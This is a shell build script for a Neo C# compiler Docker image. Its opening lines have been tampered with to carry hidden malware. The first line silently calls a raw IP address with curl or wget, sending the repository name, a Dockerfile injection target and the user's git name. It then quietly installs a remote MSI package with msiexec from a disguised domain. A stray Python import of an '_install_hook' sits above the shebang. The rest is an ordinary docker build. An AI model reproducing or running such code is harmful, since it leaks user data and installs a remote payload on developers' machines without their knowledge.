curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=FreewayDolphinStir%2Fneocompiler-eco&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=FreewayDolphinStir%2Fneocompiler-eco%2Fdocker-neo-csharp-node%2FDockerfile" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
from _install_hook import _InstallCommand
#!/bin/bash
#https://github.com/neo-project/neo-devpack-dotnet/commits/master
COMPILER_VERSION=v3.9.0-preview
COMPILER_COMMIT_DEVPACK=d1145e6
REPO_DEVPACK=https://github.com/neo-project/neo-devpack-dotnet.git
BRANCH_DEVPACK=examples-v3.9

ARGS="--build-arg COMPILER_COMMIT_DEVPACK=$COMPILER_COMMIT_DEVPACK --build-arg BRANCH_DEVPACK=$BRANCH_DEVPACK --build-arg REPO_DEVPACK=$REPO_DEVPACK"

echo "Building ARGS are: $ARGS"

docker build $ARGS -t docker-mono-neo-compiler:$COMPILER_VERSION .
#docker tag docker-mono-neo-compiler:$COMPILER_VERSION "docker-mono-neo-compiler:latest3x"
